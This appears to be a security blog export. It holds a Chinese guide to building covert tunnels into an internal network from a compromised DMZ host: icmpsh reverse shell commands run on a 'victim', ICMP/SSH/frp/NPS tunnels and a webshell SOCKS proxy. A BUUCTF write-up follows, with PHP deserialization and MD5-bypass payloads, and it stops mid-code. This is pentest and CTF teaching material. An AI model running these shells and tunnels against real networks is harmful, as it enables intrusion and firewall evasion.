      <url>2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言："><a href="#1-前言：" class="headerlink" title="1.前言："></a>1.前言：</h2><p>当我们在外网打下一个点，通过arp，netstat，以及ifconifg（ipconfig）等信息收集，发现此点为dmz，可通内网，那么这时候我们需要在此点上搭建通向内网的隧道，为内网渗透打下坚实基础。</p><h2 id="2-常用隧道分类："><a href="#2-常用隧道分类：" class="headerlink" title="2.常用隧道分类："></a>2.常用隧道分类：</h2><p>根据不同层的网络协议，大致分为以下几种常用的隧道：</p><h3 id="2-1-应用层"><a href="#2-1-应用层" class="headerlink" title="2.1 应用层"></a>2.1 应用层</h3><p>ssh隧道</p><p>http（https）隧道</p><p>dns隧道</p><h3 id="2-2-传输层"><a href="#2-2-传输层" class="headerlink" title="2.2 传输层"></a>2.2 传输层</h3><p>tcp隧道</p><p>udp隧道</p><p>常规端口转发</p><h3 id="2-3-网络层"><a href="#2-3-网络层" class="headerlink" title="2.3 网络层"></a>2.3 网络层</h3><p>Ipv6隧道</p><p>icmp隧道</p><p>gre隧道</p><h2 id="3-判断哪些流量能出网"><a href="#3-判断哪些流量能出网" class="headerlink" title="3.判断哪些流量能出网"></a>3.判断哪些流量能出网</h2><p>拿到一个点，并不是一上来就frp，frp虽然稳定，但是遇到一些特殊情况也不是很好用，如果遇到web服务器是通过端口映射出来的，本身主机不出网，这时候就得用webshell代理流量,当然还有一种，需要通过特定代理的服务器才能出网，这时候可以做浏览器的信息收集，这种情况外网资产扫端口也可以见，nmap扫出来的服务为sockets或者proxy服务什么的。</p><p>综合判断几种协议的出网情况</p><h3 id="3-1-icmp协议"><a href="#3-1-icmp协议" class="headerlink" title="3.1 icmp协议"></a>3.1 icmp协议</h3><p>ping 命令</p><h3 id="3-2-Http协议"><a href="#3-2-Http协议" class="headerlink" title="3.2 Http协议"></a>3.2 Http协议</h3><h4 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h4><p>wget 命令</p><p>curl 命令</p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows:"></a>Windows:</h4><p>telnet</p><p>浏览器</p><h3 id="dns协议："><a href="#dns协议：" class="headerlink" title="dns协议："></a>dns协议：</h3><p>指向外网的vps作为dns服务器解析域名</p><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><p>Nslookup baidu.com vps</p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>dig@vps Baidu.com</p><h2 id="4-搭建隧道实战"><a href="#4-搭建隧道实战" class="headerlink" title="4.搭建隧道实战"></a>4.搭建隧道实战</h2><h3 id="4-1-搭建ipv6隧道"><a href="#4-1-搭建ipv6隧道" class="headerlink" title="4.1 搭建ipv6隧道"></a>4.1 搭建ipv6隧道</h3><p>前提：支持ipv6，通过ipconfig（ifconfig）看有没有ipv6的地址</p><p>特点：过安全设备，防火墙奇效</p><p>原理：把ipv6协议封装数据包后继续用ipv4封装，本质在网络中传输还是ipv4，一些安全设备和防火墙不支持ipv6，所以就算拿到了进行分析也解不了包。</p><p>这里我以6tunnel为例：</p><p>github：<a href="https://github.com/wojtekka/6tunnel">https://github.com/wojtekka/6tunnel</a></p><p>gcc编译</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210315215548963.png"></p><p>端口转发：</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;6tunnel -4 80 需要转发的ipv6%eth0 80#将ipv6地址80端口转发到本地ipv4来，你也可以换成-6</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210315220238278.png"></p><blockquote><p>注意：ipv6隧道可以从ipv6地址到ipv6地址，也可以从ipv4地址到ipv6地址，但不能从ipv6到ipv4。如果从本机的ipv6地址到目标机的ipv4，测试抓到的包是ipv4的包，并不会对数据包进行ipv6封装，%是制定网卡</p></blockquote><p>访问ipv6地址时需指定网卡，例如http://[fe80::xxxx:xxxx%eth0]，或者curl -6 -g –interface eth0 “http://[fe80::20c:29ff:fe0f:57ba]:80” -vvv</p><h3 id="4-2-搭建icmp隧道"><a href="#4-2-搭建icmp隧道" class="headerlink" title="4.2 搭建icmp隧道"></a>4.2 搭建icmp隧道</h3><p>前提：防火墙waf有允许icmp包文通过，关闭系统icmp自动答复，安装python-impacket</p><p>特点：简单，实用</p><p>原理：将tcp/udp 数据封装到icmp的ping数据包中，从而建立通信</p><p>github：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><h4 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h4><p>关闭本地的icmp应答：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure><p>本地主机监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh_m.py 192.168.75.131（本地ip） 192.168.75.132（受害者ip）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316183155801.png"></p><p>在受害者主机运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t 192.168.75.131（攻击者）</span><br></pre></td></tr></table></figure><h4 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h4><p>使用的是：ptunnel kali自带</p><p>需要安装一些依赖库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libpcap环境</span><br><span class="line">libpcap依赖库</span><br><span class="line">wget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gz</span><br></pre></td></tr></table></figure><p>在攻击vps上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 182.17.13.17(跳板机外网ip) -lp 8888 -da 10.10.10.18（内网需要转发端口的ip） -dp 3389 -x Gamma</span><br></pre></td></tr></table></figure><p>在跳板机上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x Gamma</span><br></pre></td></tr></table></figure><p>内网10.10.10.18 3389端口就被转发到攻击vps的8888端口了</p><h3 id="icmp隧道搭建"><a href="#icmp隧道搭建" class="headerlink" title="icmp隧道搭建"></a>icmp隧道搭建</h3><p>安装icmptunnel</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/jamesbarlow/icmptunnel.git</span></span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>客户端和服务器需同时禁用icmp答复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure><p>这里攻击者为服务端，受害者为客户端</p><p>服务端配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;icmptunnel -s#以服务端启动</span><br><span class="line">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0 #配置一个ip</span><br></pre></td></tr></table></figure><p>客户端配置：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./icmptunnel <span class="number">192.168</span><span class="number">.75</span><span class="number">.131</span>（服务端ip）</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 #配置一个ip</span><br></pre></td></tr></table></figure><p>那么就可以隧道进行通信了</p><h3 id="4-2-tcp端口转发"><a href="#4-2-tcp端口转发" class="headerlink" title="4.2 tcp端口转发"></a>4.2 tcp端口转发</h3><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><p>工具：lcx.exe netsh ………</p><p>把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网ip 8888 内网ip 3389</span><br></pre></td></tr></table></figure><p>本地搭建端口之间的隧道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –listen 8888 3389#本地3389和8888端口进行连接</span><br></pre></td></tr></table></figure><p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看现有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">#添加转发规则</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;外网IP listenport&#x3D;6666 connectaddress&#x3D;内网IP connectport&#x3D;3389</span><br><span class="line"></span><br><span class="line">#删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport&#x3D;6666</span><br><span class="line"></span><br><span class="line">#xp需要安装ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><p>连接外网6666端口，就是连接到内网目标上面的3389。</p><p>linux：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap -m 2 -p1 4444 -h2 公网主机ip -p2 3389</span><br></pre></td></tr></table></figure><p>将4444端口的流量转发到3389端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 4444#内网主机执行</span><br></pre></td></tr></table></figure><p>把内网的22端口转发到外网的3389端口 </p><p>linux iptables使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#编辑配置文件</span><br><span class="line">vi &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">net.ipv4.ip_forward &#x3D; 1#开启IP转发</span><br><span class="line">#关闭服务</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br><span class="line"></span><br><span class="line">#保存重启服务</span><br><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure><h3 id="webshell代理工具"><a href="#webshell代理工具" class="headerlink" title="webshell代理工具"></a>webshell代理工具</h3><p>配合Webshell，复用目标的Web服务端口开一个Socks5代理隧道。</p><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#生成服务端</span><br><span class="line">python3 neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">#在本地建立Socks5代理</span><br><span class="line">python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br></pre></td></tr></table></figure><p>还可以用作端口转发，把webshell所在主机的端口转发到本地（不出网的情况很好用），请自行探索</p><h3 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h3><p>SSH一般是允许通过防火墙的，而且传输过程是加密的</p><h4 id="本地转发（正向）"><a href="#本地转发（正向）" class="headerlink" title="本地转发（正向）"></a>本地转发（正向）</h4><p>在中传VPS上执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; root@目标外网Web服务器（会要求输入密码）</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure><h3 id="远程转发（反向）"><a href="#远程转发（反向）" class="headerlink" title="远程转发（反向）"></a>远程转发（反向）</h3><p>在Web服务器上执行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; root@VPS-IP（会要求输入密码）</span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure><p>访问<code>VPS</code>的8090端口，即可连接内网数据库服务器的3389</p><h3 id="Frp搭建隧道："><a href="#Frp搭建隧道：" class="headerlink" title="Frp搭建隧道："></a>Frp搭建隧道：</h3><p>github：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>简单地说，frp就是一个反向代理软件，它体积轻量但功能很强大，可以<strong>使处于内网或防火墙后的设备对外界提供服务</strong>，它支持HTTP、TCP、UDP等众多协议。</p><h4 id="端口转发：-1"><a href="#端口转发：-1" class="headerlink" title="端口转发："></a>端口转发：</h4><p>服务端配置文件frps.init：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br></pre></td></tr></table></figure><p>客户端配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp #流量类型</span><br><span class="line">local_ip &#x3D; 内网ip     # 局域网地址，可以是非本机ip       </span><br><span class="line">local_port &#x3D; 3389#要转发的端口</span><br><span class="line">remote_port &#x3D; 7001#远程端口</span><br><span class="line">plugin &#x3D;socks5 </span><br></pre></td></tr></table></figure><p>访问vps 7001 则访问内网3389端口</p><p>启动的话就一个服务器./frps -c frps.ini 一个客户端./frpc -c frpc.ini</p><h4 id="socks5代理更简单了："><a href="#socks5代理更简单了：" class="headerlink" title="socks5代理更简单了："></a>socks5代理更简单了：</h4><p>客户端配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br><span class="line">[socks_proxy]</span><br><span class="line">type &#x3D; tcp #流量类型</span><br><span class="line">remote_port &#x3D; 7001#远程端口</span><br><span class="line">plugin &#x3D;socks5 </span><br></pre></td></tr></table></figure><h3 id="搭建NPS隧道："><a href="#搭建NPS隧道：" class="headerlink" title="搭建NPS隧道："></a>搭建NPS隧道：</h3><p>frp不行，又不会改流量特征，可以用用nps</p><p>使用步骤：</p><ul><li>开启服务端，假如公网服务器ip为1.1.1.1，配置文件中<code>bridge_port</code>为8024，配置文件中<code>web_port</code>为8080</li><li>访问1.1.1.1:8080</li><li>在客户端管理中创建一个客户端，记录下验证密钥</li><li>内网客户端运行（windows使用cmd运行加.exe）</li></ul><p>1、下载nps服务端到自己的VPS（<a href="https://ehang-io.github.io/nps%EF%BC%89">https://ehang-io.github.io/nps）</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x nps</span><br><span class="line">sudo .&#x2F;nps install#安装</span><br></pre></td></tr></table></figure><p>2.修改配置文件（敏感信息改掉/etc/nps/conf/nps.conf，原本的配置文件挺长的，运行反而会报错，直接替换成以下的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">appname &#x3D; nps</span><br><span class="line">#Boot mode(dev|pro)</span><br><span class="line">runmode &#x3D; dev</span><br><span class="line"></span><br><span class="line">##bridge</span><br><span class="line"># 底层通信协议，默认tcp，可选用kcp</span><br><span class="line">bridge_type&#x3D;tcp</span><br><span class="line"># 底层通信端口，默认8024，如已被占用请指定其他端口</span><br><span class="line">bridge_port&#x3D;8024</span><br><span class="line">bridge_ip&#x3D;0.0.0.0</span><br><span class="line"></span><br><span class="line"># 当客户端以配置文件模式启动时会用到的验证密钥，可自行设置，本教程不会使用到</span><br><span class="line">public_vkey&#x3D;&lt;你的通信密钥&gt;</span><br><span class="line"></span><br><span class="line">#web</span><br><span class="line">web_host&#x3D;&lt;服务器IP或域名&gt;</span><br><span class="line">web_username&#x3D;&lt;设置用户名&gt;</span><br><span class="line">web_password&#x3D;&lt;设置密码&gt;</span><br><span class="line">web_port &#x3D; &lt;网页面板端口&gt;</span><br><span class="line">web_ip&#x3D;0.0.0.0</span><br></pre></td></tr></table></figure><p>3.开启服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nps start#启动</span><br><span class="line">sudo nps stop#停止</span><br><span class="line">sudo nps reload#服务端配置文件重载</span><br></pre></td></tr></table></figure><p>4.访问vpsip s:8080，在客户端管理中创建一个客户端，记录下验证密钥（也可以不设置，则会默认生成）</p><p>选择客户端通过配置文件连接为否，不然可能会配置冲突，点击新增，新增成功</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316212917305.png"></p><p>可以直接看到客户端启动命令可以直接复制。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213053224.png"></p><p>下载对应的客户端，因为我这里下载的服务端为linux_amd64，则下载windows_amd64</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213529139.png"></p><p>运行命令可以看到连接成功。</p><p>web界面也可以看到主机上线</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213624435.png"></p><p>下一步就能对客户端进行操作了：</p><p>直接点击隧道选项，对该客户端进行操作……</p><p> <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316214310793.png"></p><p>非常的好用嗷！</p><p>当然小众的一些代理工具会更好用，给自己立个flag，自己开发一个代理工具</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Web分类练习</title>
      <link href="2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/"/>
      <url>2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="代码审计以及反序列化"><a href="#代码审计以及反序列化" class="headerlink" title="代码审计以及反序列化"></a>代码审计以及反序列化</h1><h2 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: jinzhao</span><br><span class="line"> * Date: 2019&#x2F;10&#x2F;6</span><br><span class="line"> * Time: 8:04 PM</span><br><span class="line"> *&#x2F;</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">class BUU &#123;</span><br><span class="line">   public $correct &#x3D; &quot;&quot;;</span><br><span class="line">   public $input &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct &#x3D; base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct &#x3D;&#x3D;&#x3D; $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;&#x2F;flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if($_GET[&#39;pleaseget&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;) &#123;</span><br><span class="line">    if($_POST[&#39;pleasepost&#39;] &#x3D;&#x3D;&#x3D; &#39;2&#39;) &#123;</span><br><span class="line">        if(md5($_POST[&#39;md51&#39;]) &#x3D;&#x3D; md5($_POST[&#39;md52&#39;]) &amp;&amp; $_POST[&#39;md51&#39;] !&#x3D; $_POST[&#39;md52&#39;]) &#123;</span><br><span class="line">            unserialize($_POST[&#39;obj&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get和post传参，MD5碰撞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get：?pleaseget&#x3D;1</span><br><span class="line">post：pleasepost&#x3D;2&amp;md51[]&#x3D;1&amp;md52[]&#x3D;2</span><br></pre></td></tr></table></figure><p>php反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU&#123;</span><br><span class="line">    public $correct&#x3D;&quot;&quot;;</span><br><span class="line">    public $input&#x3D;&quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj&#x3D; new BUU;</span><br><span class="line">$obj-&gt;input&#x3D;&amp;$obj-&gt;correct;</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/476597133.png"></p><p>进而构造payload，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">pleasepost&#x3D;2&amp;md51[]&#x3D;1&amp;md52[]&#x3D;2&amp;obj&#x3D;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3997285449.png"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2193258869.png"></p><p>在注解中我们发现 <code>source.php</code> ；访问得到源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include 